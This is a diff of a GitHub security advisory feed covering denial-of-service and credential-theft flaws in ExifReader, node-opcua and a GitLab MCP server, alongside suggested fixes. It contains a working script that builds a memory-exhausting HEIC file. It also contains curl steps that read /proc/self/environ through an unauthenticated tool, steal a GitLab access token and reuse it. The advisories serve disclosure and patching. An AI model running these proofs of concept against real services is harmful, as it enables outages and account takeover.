+<p>ExifReader 4.41.0 is vulnerable to denial of service through a crafted HEIC or AVIF file with a malicious <code>iloc</code> box. When <code>offsetSize</code>, <code>lengthSize</code>, and <code>baseOffsetSize</code> are set to zero in the iloc header, the extent-parsing loop allocates an unbounded number of JavaScript objects - up to <code>itemCount × extentCount</code> (65535 × 65535 = 4.3 billion) - without advancing the buffer offset. A 652-byte file causes 400MB of heap growth; a 6KB file exhausts all system memory and crashes the Node.js process with a JavaScript heap out-of-memory error.</p>
+<h2 id="affected-version-tested">Affected version tested</h2>
+<ul>
+<li>npm package: <code>exifreader</code></li>
+<li>Version: <code>4.41.0</code></li>
+<li>Affected formats: HEIC, AVIF (ISO-BMFF container)</li>
+</ul>
+<h2 id="root-cause">Root cause</h2>
+<p><strong>File:</strong> <code>src/image-header-iso-bmff-iloc.js</code>, lines 79–116, function <code>getItems()</code>.</p>
+<p>The iloc parser reads four size fields from the file (each a 4-bit nibble, valid values 0–15):</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Controls</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>offsetSize</code></td>
+<td>Bytes per extent offset</td>
+</tr>
+<tr>
+<td><code>lengthSize</code></td>
+<td>Bytes per extent length</td>
+</tr>
+<tr>
+<td><code>baseOffsetSize</code></td>
+<td>Bytes per item base offset</td>
+</tr>
+<tr>
+<td><code>indexSize</code></td>
+<td>Bytes per extent index</td>
+</tr>
+</tbody></table>
+<p>The code then enters a nested loop: for each item (up to 65535), and for each extent within that item (up to 65535), it reads variable-width fields and advances the buffer offset by the corresponding size:</p>
+<pre><code class="language-javascript">for (let j = 0; j &lt; item.extentCount; j++) {
+    const extent = {};
+    extent.extentIndex = getExtentIndex(dataView, version, offset, indexSize);
+    offset += sizes.item.extent.extentIndex;       // 0 when indexSize=0
+    extent.extentOffset = getVariableSizedValue(dataView, offset, offsetSize);
+    offset += sizes.item.extent.extentOffset;       // 0 when offsetSize=0
+    extent.extentLength = getVariableSizedValue(dataView, offset, lengthSize);
+    offset += sizes.item.extent.extentLength;       // 0 when lengthSize=0
+    item.extents.push(extent);                      // allocates unconditionally
+}
+</code></pre>
+<p>When all four size fields are zero (a valid value per the ISO-BMFF specification, meaning "field not present"), the buffer offset never advances inside the inner loop. Yet every iteration still pushes a new extensible object onto <code>item.extents</code>. There is no iteration cap, no cumulative allocation budget, and no guard that skips the inner loop when all sizes are zero.</p>
+<h2 id="reproduction">Reproduction</h2>
+<p>Save the following as <code>poc_iloc_dos.js</code> and run with Node.js against the bundled <code>dist/exif-reader.js</code>:</p>
+<pre><code class="language-javascript">const fs = require('fs');
+const ExifReader = require('../ExifReader-4.41.0/dist/exif-reader.js');
+
+function u32be(n) {
+    return [(n &gt;&gt;&gt; 24) &amp; 255, (n &gt;&gt;&gt; 16) &amp; 255, (n &gt;&gt;&gt; 8) &amp; 255, n &amp; 255];
+}
+function u16be(n) {
+    return [(n &gt;&gt;&gt; 8) &amp; 255, n &amp; 255];
+}
+function str(s) {
+    return Array.from(Buffer.from(s, 'ascii'));
+}
+function box(type, content) {
+    return [...u32be(8 + content.length), ...str(type), ...content];
+}
+
+const ITEMS = 10000;
+const EXTENTS = 65535;
+
+const ftyp = box('ftyp', [
+    ...str('heic'),
+    ...u32be(0),
+    ...str('mif1'),
+    0, 0, 0, 0,
+]);
+
+const ilocPayload = [
+    0, 0, 0, 0,
+    0, 0,
+    ...u16be(ITEMS),
+];
+
+for (let i = 0; i &lt; ITEMS; i++) {
+    ilocPayload.push(...u16be(i + 1));
+    ilocPayload.push(...u16be(0));
+    ilocPayload.push(...u16be(EXTENTS));
+}
+
+const iloc = box('iloc', ilocPayload);
+const meta = box('meta', [0, 0, 0, 0, ...iloc]);
+const data = Uint8Array.from([...ftyp, ...meta]);
+
+fs.writeFileSync('/tmp/poc_iloc_dos.heic', data);
+
+console.log(`${data.length} bytes | ${ITEMS} items x ${EXTENTS} extents | ~${((ITEMS * EXTENTS * 80) / (1024 ** 3)).toFixed(0)} GB expected`);
+
+const start = Date.now();
+const timeout = setTimeout(() =&gt; {
+    console.log(`[DoS CONFIRMED] Hung after ${((Date.now() - start) / 1000).toFixed(1)}s`);
+    process.exit(1);
+}, 30000);
+
+try {
+    ExifReader.load(data.buffer);
+    clearTimeout(timeout);
+    console.log(`Parse completed in ${((Date.now() - start) / 1000).toFixed(1)}s`);
+} catch (e) {
+    clearTimeout(timeout);
+    console.log(`Error: ${e.message}`);
+}
+</code></pre>
+<h3 id="scaled-test-results">Scaled test results</h3>
+<p>Run the above with different ITEMS values:</p>
+<table>
+<thead>
+<tr>
+<th>Items</th>
+<th>File size</th>
+<th>Extent objects</th>
+<th>Parse time</th>
+<th>Heap growth</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>58 bytes</td>
+<td>65,535</td>
+<td>0.03s</td>
+<td>+4 MB</td>
+</tr>
+<tr>
+<td>5</td>
+<td>82 bytes</td>
+<td>327,675</td>
+<td>0.17s</td>
+<td>+16 MB</td>
+</tr>
+<tr>
+<td>100</td>
+<td>652 bytes</td>
+<td>6,553,500</td>
+<td>1.74s</td>
+<td>+401 MB</td>
+</tr>
+<tr>
+<td>256</td>
+<td>1,588 bytes</td>
+<td>16,776,960</td>
+<td>~8s</td>
+<td>OOM crash</td>
+</tr>
+<tr>
+<td>10000</td>
+<td>60,052 bytes</td>
+<td>655,350,000</td>
+<td>-</td>
+<td>OOM crash (4 GB+)</td>
+</tr>
+<tr>
+<td><img src="https://github.com/user-attachments/assets/cc3bd540-4197-4ada-93c9-3397811a6c02" alt="image" height="588" width="1839"></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="expected-behavior">Expected behavior</h2>
+<p>A zero-size field is valid per the ISO-BMFF spec (it means the field is not present). The parser should either:</p>
+<ol>
+<li>Skip the inner extent loop when all extent field sizes are zero and no items need extent data, or</li>
+<li>Cap the number of extent objects allocated (e.g., a per-item or cumulative budget).</li>
+</ol>
+<h2 id="security-impact">Security impact</h2>
+<p>This is a denial-of-service vulnerability. An unauthenticated attacker can craft a ~1 KB HEIC/AVIF image that, when parsed by ExifReader, causes a JavaScript heap out-of-memory crash, aborting the application process. Any web service, desktop application, or mobile app that processes user-uploaded HEIC/AVIF images through ExifReader is affected.</p>
+<p><strong>Note:</strong> The impact is established using ExifReader's existing distributed (<code>dist/exif-reader.js</code>) code.</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>In <code>src/image-header-iso-bmff-iloc.js</code>, in the <code>getItems()</code> function, add a maximum per-item extent limit:</p>
+<pre><code class="language-javascript">const MAX_EXTENTS_PER_ITEM = 10000;
+
+for (let j = 0; j &lt; item.extentCount; j++) {
+    if (item.extents.length &gt;= MAX_EXTENTS_PER_ITEM) {
+        break;
+    }
+    // ... existing code ...
+}
+</code></pre>
+<p>Alternatively (or additionally), skip the inner loop when all extent field sizes are zero:</p>
+<pre><code class="language-javascript">if (sizes.item.extent.extentOffset === 0 &amp;&amp; sizes.item.extent.extentLength === 0) {
+    // Fields are absent per spec; nothing meaningful to read
+    // Still advance offset if extentCount &gt; 0 to maintain correctness
+    continue;
+}
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/mattiasw/ExifReader/security/advisories/GHSA-pj96-35fp-cfcc">https://github.com/mattiasw/ExifReader/security/advisories/GHSA-pj96-35fp-cfcc</a></li>
+<li><a href="https://github.com/mattiasw/ExifReader/commit/17b901cd192d2c90d7f9f347bd3073b28b482699">https://github.com/mattiasw/ExifReader/commit/17b901cd192d2c90d7f9f347bd3073b28b482699</a></li>
+<li><a href="https://github.com/mattiasw/ExifReader/releases/tag/v4.41.1">https://github.com/mattiasw/ExifReader/releases/tag/v4.41.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-pj96-35fp-cfcc">https://github.com/advisories/GHSA-pj96-35fp-cfcc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-pj96-35fp-cfcc</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-17T16:30:00.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[next-tinacms-azure] Tina: [Broken Access Control] letting any TinaCloud user authorize against any self-hosted site]]></title>
         <id>https://github.com/advisories/GHSA-g74q-6g2f-874x</id>
@@ -1887,433 +2511,5 @@ Requesting CVE assignment and credit as reporter upon fix publication.</p>
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-09-16T16:19:21.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[node-opcua-client] node-opcua: TCP Socket Leak (FIN-WAIT-2) via keepalive reconnection cycle - Resource Exhaustion]]></title>
-        <id>https://github.com/advisories/GHSA-r2pf-9cw4-5j65</id>
-        <link href="https://github.com/advisories/GHSA-r2pf-9cw4-5j65"/>
-        <updated>2026-09-16T16:19:22.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">SUMMARY</h2>
-<p>A combination of bugs in node-opcua causes unlimited TCP socket accumulation (FIN-WAIT-2 state) during automatic reconnection, leading to memory exhaustion and eventual container/process crash (OOM kill). The issue is triggered by the default configuration (keepSessionAlive: true) when the OPC UA server has clock skew relative to the client.</p>
-<p>Affected version: Tested on 2.169.0 (latest as of April 2026).</p>
-<h2 id="environment">ENVIRONMENT</h2>
-<ul>
-<li>Node.js: v24.11.0</li>
-<li>node-opcua: 2.169.0</li>
-<li>OS: Linux (containerized via Podman, slirp4netns networking)</li>
-<li>OPC UA Server: Industrial PLC (opc.tcp endpoint), clock skew of ~50 minutes ahead of client</li>
-<li>Client config: keepSessionAlive: true (default), keepAliveInterval: 3000, securityMode: None, securityPolicy: None</li>
-</ul>
-<h2 id="root-cause-analysis">ROOT CAUSE ANALYSIS</h2>
-<p>Bug #1 - ClientTCP_transport._on_ACK_response() uses socket.end() instead of socket.destroy()</p>
-<p>File: node-opcua-transport/src/client_tcp_transport.ts, _on_ACK_response() method</p>
-<p>When the HEL/ACK handshake fails during a reconnection attempt, the error handler calls socket.end():</p>
-<pre><code>if (err || !data) {
-    externalCallback(err || new Error("no data"));
-    if (this._socket) {
-        this._socket.end();   // &lt;- sends TCP FIN, leaves socket in FIN-WAIT-2
-    }
-}
-</code></pre>
-<p>socket.end() sends a TCP FIN and waits for the peer to close its side. If the peer doesn't respond (common with PLCs), the socket remains in FIN-WAIT-2 state indefinitely, leaking file descriptors and memory.
-During rapid reconnection cycles (triggered by Bug #2 below), every failed HEL/ACK creates a new leaked socket.</p>
-<hr>
-<p>Bug #2 - ClientSessionKeepAliveManager._ping_server() treats BadInvalidTimestamp as network outage</p>
-<p>File: node-opcua-client/src/client_session_keepalive_manager.ts, _ping_server() method</p>
-<p>The keepalive manager reads Server.ServerStatus.CurrentTime on each ping cycle. If the server responds with BadInvalidTimestamp (because the client's RequestHeader.timestamp falls outside the server's tolerance window due to clock skew), the manager treats this as a fatal network error:</p>
-<pre><code>// Any error -&gt; emit("failure") -&gt; terminateConnection() -&gt; forceConnectionBreak()
-</code></pre>
-<p>This triggers a full transport-level reconnection on every keepalive cycle (every keepAliveInterval ms). Combined with Bug #1, each reconnection attempt leaks one TCP socket in FIN-WAIT-2.
-Impact amplification: With keepAliveInterval: 3000 (3 seconds), the client leaks ~20 sockets/minute, ~1200/hour, exhausting resources in hours.</p>
-<h2 id="reproduction-steps">REPRODUCTION STEPS</h2>
-<ol>
-<li>Set up an OPC UA server with a clock skewed more than the server's timestamp tolerance ahead of the client.</li>
-<li>Connect using node-opcua with default settings (keepSessionAlive: true).</li>
-<li>Monitor TCP sockets: ss -antp | grep FIN-WAIT-2 | wc -l</li>
-<li>Observe FIN-WAIT-2 count growing continuously (approximately one per keepalive interval).</li>
-<li>Eventually the process runs out of file descriptors or memory and crashes.</li>
-</ol>
-<h2 id="suggested-fixes">SUGGESTED FIXES</h2>
-<p>For Bug #1 (_on_ACK_response):</p>
-<pre><code>// Replace socket.end() with socket.destroy()
-if (this._socket) {
-    this._socket.destroy();
-}
-</code></pre>
-<p>For Bug #2 (_ping_server):
-Distinguish between transport-level errors (actual network outage) and application-level OPC UA status codes like BadInvalidTimestamp. The latter indicates the server is reachable and the session is alive - only the timestamp validation failed. The keepalive should not trigger reconnection.</p>
-<h2 id="reporter">REPORTER</h2>
-<p>Marco Velluso @Velluso
-<a href="mailto:velluso.marco64@gmail.com">velluso.marco64@gmail.com</a>
-Requesting CVE assignment and credit as reporter upon fix publication.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/node-opcua/node-opcua/security/advisories/GHSA-r2pf-9cw4-5j65">https://github.com/node-opcua/node-opcua/security/advisories/GHSA-r2pf-9cw4-5j65</a></li>
-<li><a href="https://github.com/node-opcua/node-opcua/pull/1497">https://github.com/node-opcua/node-opcua/pull/1497</a></li>
-<li><a href="https://github.com/node-opcua/node-opcua/commit/1959cbb8946b386d2e24a1cce05b7148099d36e7">https://github.com/node-opcua/node-opcua/commit/1959cbb8946b386d2e24a1cce05b7148099d36e7</a></li>
-<li><a href="https://github.com/node-opcua/node-opcua/commit/481664fa6ba8204737c5a92797ff68c3ae780c1c">https://github.com/node-opcua/node-opcua/commit/481664fa6ba8204737c5a92797ff68c3ae780c1c</a></li>
-<li><a href="https://github.com/node-opcua/node-opcua/commit/4d59197e2dbd82791d7f36dad7da178715e0c27a">https://github.com/node-opcua/node-opcua/commit/4d59197e2dbd82791d7f36dad7da178715e0c27a</a></li>
-<li><a href="https://github.com/node-opcua/node-opcua/commit/dc406fd2d364aa69dd173be21ed32a7ff425017a">https://github.com/node-opcua/node-opcua/commit/dc406fd2d364aa69dd173be21ed32a7ff425017a</a></li>
-<li><a href="https://github.com/node-opcua/node-opcua/releases/tag/v2.170.0">https://github.com/node-opcua/node-opcua/releases/tag/v2.170.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-r2pf-9cw4-5j65">https://github.com/advisories/GHSA-r2pf-9cw4-5j65</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r2pf-9cw4-5j65</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-16T16:19:21.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[node-opcua-transport] node-opcua: TCP Socket Leak (FIN-WAIT-2) via keepalive reconnection cycle - Resource Exhaustion]]></title>
-        <id>https://github.com/advisories/GHSA-r2pf-9cw4-5j65</id>
-        <link href="https://github.com/advisories/GHSA-r2pf-9cw4-5j65"/>
-        <updated>2026-09-16T16:19:22.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">SUMMARY</h2>
-<p>A combination of bugs in node-opcua causes unlimited TCP socket accumulation (FIN-WAIT-2 state) during automatic reconnection, leading to memory exhaustion and eventual container/process crash (OOM kill). The issue is triggered by the default configuration (keepSessionAlive: true) when the OPC UA server has clock skew relative to the client.</p>
-<p>Affected version: Tested on 2.169.0 (latest as of April 2026).</p>
-<h2 id="environment">ENVIRONMENT</h2>
-<ul>
-<li>Node.js: v24.11.0</li>
-<li>node-opcua: 2.169.0</li>
-<li>OS: Linux (containerized via Podman, slirp4netns networking)</li>
-<li>OPC UA Server: Industrial PLC (opc.tcp endpoint), clock skew of ~50 minutes ahead of client</li>
-<li>Client config: keepSessionAlive: true (default), keepAliveInterval: 3000, securityMode: None, securityPolicy: None</li>
-</ul>
-<h2 id="root-cause-analysis">ROOT CAUSE ANALYSIS</h2>
-<p>Bug #1 - ClientTCP_transport._on_ACK_response() uses socket.end() instead of socket.destroy()</p>
-<p>File: node-opcua-transport/src/client_tcp_transport.ts, _on_ACK_response() method</p>
-<p>When the HEL/ACK handshake fails during a reconnection attempt, the error handler calls socket.end():</p>
-<pre><code>if (err || !data) {
-    externalCallback(err || new Error("no data"));
-    if (this._socket) {
-        this._socket.end();   // &lt;- sends TCP FIN, leaves socket in FIN-WAIT-2
-    }
-}
-</code></pre>
-<p>socket.end() sends a TCP FIN and waits for the peer to close its side. If the peer doesn't respond (common with PLCs), the socket remains in FIN-WAIT-2 state indefinitely, leaking file descriptors and memory.
-During rapid reconnection cycles (triggered by Bug #2 below), every failed HEL/ACK creates a new leaked socket.</p>
-<hr>
-<p>Bug #2 - ClientSessionKeepAliveManager._ping_server() treats BadInvalidTimestamp as network outage</p>
-<p>File: node-opcua-client/src/client_session_keepalive_manager.ts, _ping_server() method</p>
-<p>The keepalive manager reads Server.ServerStatus.CurrentTime on each ping cycle. If the server responds with BadInvalidTimestamp (because the client's RequestHeader.timestamp falls outside the server's tolerance window due to clock skew), the manager treats this as a fatal network error:</p>
-<pre><code>// Any error -&gt; emit("failure") -&gt; terminateConnection() -&gt; forceConnectionBreak()
-</code></pre>
-<p>This triggers a full transport-level reconnection on every keepalive cycle (every keepAliveInterval ms). Combined with Bug #1, each reconnection attempt leaks one TCP socket in FIN-WAIT-2.
-Impact amplification: With keepAliveInterval: 3000 (3 seconds), the client leaks ~20 sockets/minute, ~1200/hour, exhausting resources in hours.</p>
-<h2 id="reproduction-steps">REPRODUCTION STEPS</h2>
-<ol>
-<li>Set up an OPC UA server with a clock skewed more than the server's timestamp tolerance ahead of the client.</li>
-<li>Connect using node-opcua with default settings (keepSessionAlive: true).</li>
-<li>Monitor TCP sockets: ss -antp | grep FIN-WAIT-2 | wc -l</li>
-<li>Observe FIN-WAIT-2 count growing continuously (approximately one per keepalive interval).</li>
-<li>Eventually the process runs out of file descriptors or memory and crashes.</li>
-</ol>
-<h2 id="suggested-fixes">SUGGESTED FIXES</h2>
-<p>For Bug #1 (_on_ACK_response):</p>
-<pre><code>// Replace socket.end() with socket.destroy()
-if (this._socket) {
-    this._socket.destroy();
-}
-</code></pre>
-<p>For Bug #2 (_ping_server):
-Distinguish between transport-level errors (actual network outage) and application-level OPC UA status codes like BadInvalidTimestamp. The latter indicates the server is reachable and the session is alive - only the timestamp validation failed. The keepalive should not trigger reconnection.</p>
-<h2 id="reporter">REPORTER</h2>
-<p>Marco Velluso @Velluso
-<a href="mailto:velluso.marco64@gmail.com">velluso.marco64@gmail.com</a>
-Requesting CVE assignment and credit as reporter upon fix publication.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/node-opcua/node-opcua/security/advisories/GHSA-r2pf-9cw4-5j65">https://github.com/node-opcua/node-opcua/security/advisories/GHSA-r2pf-9cw4-5j65</a></li>
-<li><a href="https://github.com/node-opcua/node-opcua/pull/1497">https://github.com/node-opcua/node-opcua/pull/1497</a></li>
-<li><a href="https://github.com/node-opcua/node-opcua/commit/1959cbb8946b386d2e24a1cce05b7148099d36e7">https://github.com/node-opcua/node-opcua/commit/1959cbb8946b386d2e24a1cce05b7148099d36e7</a></li>
-<li><a href="https://github.com/node-opcua/node-opcua/commit/481664fa6ba8204737c5a92797ff68c3ae780c1c">https://github.com/node-opcua/node-opcua/commit/481664fa6ba8204737c5a92797ff68c3ae780c1c</a></li>
-<li><a href="https://github.com/node-opcua/node-opcua/commit/4d59197e2dbd82791d7f36dad7da178715e0c27a">https://github.com/node-opcua/node-opcua/commit/4d59197e2dbd82791d7f36dad7da178715e0c27a</a></li>
-<li><a href="https://github.com/node-opcua/node-opcua/commit/dc406fd2d364aa69dd173be21ed32a7ff425017a">https://github.com/node-opcua/node-opcua/commit/dc406fd2d364aa69dd173be21ed32a7ff425017a</a></li>
-<li><a href="https://github.com/node-opcua/node-opcua/releases/tag/v2.170.0">https://github.com/node-opcua/node-opcua/releases/tag/v2.170.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-r2pf-9cw4-5j65">https://github.com/advisories/GHSA-r2pf-9cw4-5j65</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r2pf-9cw4-5j65</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-16T16:19:21.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@zereight/mcp-gitlab] @zereight/mcp-gitlab: Unauthenticated arbitrary file read via `upload_markdown` enables PAT exfiltration and full account takeover]]></title>
-        <id>https://github.com/advisories/GHSA-cv3r-c5h8-f4g5</id>
-        <link href="https://github.com/advisories/GHSA-cv3r-c5h8-f4g5"/>
-        <updated>2026-09-16T13:48:30.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The SSE transport mode (<code>SSE=true</code>) exposes all MCP tools without any authentication. The <code>upload_markdown</code> tool reads arbitrary files from the server's local filesystem via an unsanitized <code>file_path</code> parameter and uploads them to a GitLab project. Combined, any unauthenticated network-reachable attacker can read <code>/proc/self/environ</code> to steal the server's <code>GITLAB_PERSONAL_ACCESS_TOKEN</code> and achieve full GitLab account takeover. This is the default configuration for Docker deployments.</p>
-<h3 id="details">Details</h3>
-<p>Two issues chain together:</p>
-<p><strong>1. No authentication on SSE transport (<code>src/index.ts:7350-7388</code>)</strong></p>
-<p>When <code>SSE=true</code> (the intended mode for Docker deployments per <code>docker-compose.yaml</code>), the <code>/sse</code> and <code>/messages</code> endpoints have zero authentication middleware. Any HTTP client that can reach the port can establish a session and invoke all ~100+ tools using the server's configured PAT.</p>
-<pre><code class="language-typescript">// src/index.ts:7354 — no auth check
-app.get("/sse", async (_: Request, res: Response) =&gt; {
-    const serverInstance = createServer();
-    const transport = new SSEServerTransport("/messages", res);
-    await serverInstance.connect(transport);
-});
-</code></pre>
-<p>Remote Authorization (<code>REMOTE_AUTHORIZATION=true</code>) is explicitly incompatible with SSE mode (<code>src/index.ts:1833-1839</code>), so there is no way to add per-request auth in this transport.</p>
-<p><strong>2. Arbitrary file read in <code>upload_markdown</code> (<code>src/index.ts:5461-5503</code>)</strong></p>
-<p>The <code>upload_markdown</code> tool calls <code>fs.readFileSync(filePath)</code> where <code>filePath</code> comes directly from user input with no validation. The Zod schema (<code>src/schemas.ts:2150-2153</code>) defines <code>file_path</code> as <code>z.string()</code> with no path restrictions, allowlists, or sandboxing.</p>
-<pre><code class="language-typescript">async function markdownUpload(projectId: string, filePath: string) {
-    if (!fs.existsSync(filePath)) {
-        throw new Error(`File not found: ${filePath}`);
-    }
-    const fileBuffer = fs.readFileSync(filePath);  // Arbitrary file read — no path validation
-    // ... uploads to GitLab project via POST /projects/:id/uploads
-}
-</code></pre>
-<p>This tool is in the <code>users</code> toolset, which is <strong>enabled by default</strong>.</p>
-<p><strong>Docker amplification:</strong> The <code>Dockerfile</code> has no <code>USER</code> directive, so the process runs as root. The <code>docker-compose.yaml</code> maps <code>3002:3002</code>, which binds <code>0.0.0.0</code> by default, exposing the unauthenticated endpoint to the network.</p>
-<h3 id="poc">PoC</h3>
-<p><strong>Prerequisites:</strong></p>
-<ul>
-<li>A running <code>@zereight/mcp-gitlab</code> instance with <code>SSE=true</code> and <code>GITLAB_PERSONAL_ACCESS_TOKEN</code> set (this is the default Docker deployment config)</li>
-<li>Network access to the server's port (default: 3002)</li>
-<li>A GitLab project ID the PAT has write access to (use <code>list_projects</code> to enumerate)</li>
-</ul>
-<p><strong>Steps:</strong></p>
-<pre><code class="language-bash"># 1. Connect to the unauthenticated SSE endpoint and capture the session ID
-SESSION_ID=$(curl -s -N http://&lt;HOST&gt;:3002/sse | head -1 | grep -oP 'sessionId=\K[^&amp;\s]+')
-
-# 2. (Optional) Enumerate accessible projects to find a writable project ID
-curl -X POST "http://&lt;HOST&gt;:3002/messages?sessionId=$SESSION_ID" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "jsonrpc": "2.0",
-    "id": 1,
-    "method": "tools/call",
-    "params": {
-      "name": "list_projects",
-      "arguments": {"owned": true}
-    }
-  }'
-
-# 3. Read /proc/self/environ (contains GITLAB_PERSONAL_ACCESS_TOKEN in plaintext)
-#    and upload it to a GitLab project
-curl -X POST "http://&lt;HOST&gt;:3002/messages?sessionId=$SESSION_ID" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "jsonrpc": "2.0",
-    "id": 2,
-    "method": "tools/call",
-    "params": {
-      "name": "upload_markdown",
-      "arguments": {
-        "project_id": "&lt;WRITABLE_PROJECT_ID&gt;",
-        "file_path": "/proc/self/environ"
-      }
-    }
-  }'
-
-# 4. The response contains a GitLab upload URL like:
-#    {"markdown": "![environ](/uploads/abc123def456/environ)", "url": "/uploads/abc123def456/environ"}
-#
-# 5. Retrieve the uploaded file from GitLab:
-curl "https://gitlab.example.com/&lt;namespace&gt;/&lt;project&gt;/uploads/abc123def456/environ"
-
-# 6. The file contains NUL-separated environment variables including:
-#    GITLAB_PERSONAL_ACCESS_TOKEN=glpat-xxxxxxxxxxxxxxxxxxxx
-#
-# 7. Use the stolen PAT for full GitLab API access:
-curl -H "Private-Token: glpat-xxxxxxxxxxxxxxxxxxxx" "https://gitlab.example.com/api/v4/user"
-</code></pre>
-<p><strong>Other exfiltrable targets (running as root in Docker):</strong></p>
-<table>
-<thead>
-<tr>
-<th>File</th>
-<th>Contents</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>/proc/self/environ</code></td>
-<td>All env vars including <code>GITLAB_PERSONAL_ACCESS_TOKEN=glpat-xxxxx</code></td>
-</tr>
-<tr>
-<td><code>/proc/self/cmdline</code></td>
-<td>Command line args (token if passed via CLI)</td>
-</tr>
-<tr>
-<td><code>/etc/shadow</code></td>
-<td>System password hashes</td>
-</tr>
-<tr>
-<td><code>/app/build/index.js</code></td>
-<td>Full application source code</td>
-</tr>
-<tr>
-<td><code>~/.gitlab-mcp-token.json</code></td>
-<td>OAuth tokens (if OAuth mode was used)</td>
-</tr>
-</tbody></table>
-<h3 id="impact">Impact</h3>
-<p><strong>Unauthenticated full GitLab account takeover.</strong> Any attacker with network access to the MCP server port can steal the Personal Access Token and gain complete access to the GitLab instance as the token owner - including all repositories, CI/CD secrets and variables, deploy keys, project settings, and admin functions if the user has admin privileges. No credentials or user interaction are required. This is the default configuration for Docker deployments</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/zereight/gitlab-mcp/security/advisories/GHSA-cv3r-c5h8-f4g5">https://github.com/zereight/gitlab-mcp/security/advisories/GHSA-cv3r-c5h8-f4g5</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-61560">https://nvd.nist.gov/vuln/detail/CVE-2026-61560</a></li>
-<li><a href="https://github.com/zereight/gitlab-mcp/pull/482">https://github.com/zereight/gitlab-mcp/pull/482</a></li>
-<li><a href="https://github.com/zereight/gitlab-mcp/pull/554">https://github.com/zereight/gitlab-mcp/pull/554</a></li>
-<li><a href="https://github.com/zereight/gitlab-mcp/pull/622">https://github.com/zereight/gitlab-mcp/pull/622</a></li>
-<li><a href="https://github.com/zereight/gitlab-mcp/commit/e436ee4ad067b64584ec9312c9e9c9a2641c1976">https://github.com/zereight/gitlab-mcp/commit/e436ee4ad067b64584ec9312c9e9c9a2641c1976</a></li>
-<li><a href="https://github.com/zereight/gitlab-mcp/releases/tag/v2.1.27">https://github.com/zereight/gitlab-mcp/releases/tag/v2.1.27</a></li>
-<li><a href="https://github.com/advisories/GHSA-cv3r-c5h8-f4g5">https://github.com/advisories/GHSA-cv3r-c5h8-f4g5</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cv3r-c5h8-f4g5</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-09-16T13:48:28.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@zereight/mcp-gitlab] @zereight/mcp-gitlab Vulnerable to Server-Side Request Forgery]]></title>
-        <id>https://github.com/advisories/GHSA-2h44-8472-frjj</id>
-        <link href="https://github.com/advisories/GHSA-2h44-8472-frjj"/>
-        <updated>2026-09-15T20:57:29.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="server-side-request-forgery-via-x-gitlab-api-url-header-allows-credential-theft">Server-Side Request Forgery via X-GitLab-API-URL Header Allows Credential Theft</h1>
-<h2 id="affected">Affected</h2>
-<ul>
-<li><strong>Repository:</strong> <code>zereight/gitlab-mcp</code></li>
-<li><strong>Affected versions:</strong> All versions through commit <code>74a8c83</code></li>
-<li><strong>Patched versions:</strong> None at time of report</li>
-</ul>
-<h2 id="severity">Severity</h2>
-<p>High. CVSS v3.1 8.5 (<code>AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N</code>)</p>
-<h2 id="description">Description</h2>
-<p>When the environment variable <code>ENABLE_DYNAMIC_API_URL=true</code> is set, the server
-reads the <code>X-GitLab-API-URL</code> HTTP request header and uses it as the base URL for
-all outbound GitLab API calls made within that request. The server validates that
-the value is a well-formed URL (<code>new URL(dynamicApiUrl)</code>) but applies no
-allowlist or hostname restriction. The server then attaches the victim's
-<code>Private-Token</code> to every outbound fetch that uses the redirected URL.</p>
-<p>Any caller who can reach the HTTP transport can set <code>X-GitLab-API-URL</code> to an
-attacker-controlled host. The next GitLab API call the server makes delivers the
-victim's token to that host.</p>
-<p>The vulnerable code appears at two locations.</p>
-<p><strong>SSE handler (<code>index.ts:11541</code>):</strong></p>
-<pre><code class="language-typescript">const dynamicApiUrl = req.headers["x-gitlab-api-url"]?.trim();
-if (ENABLE_DYNAMIC_API_URL &amp;&amp; dynamicApiUrl) {
-  apiUrl = normalizeGitLabApiUrl(dynamicApiUrl);   // no allowlist check
-}
-</code></pre>
-<p><strong>Streamable HTTP handler (<code>index.ts:11787</code>), inside <code>parseAuthHeaders</code>:</strong></p>
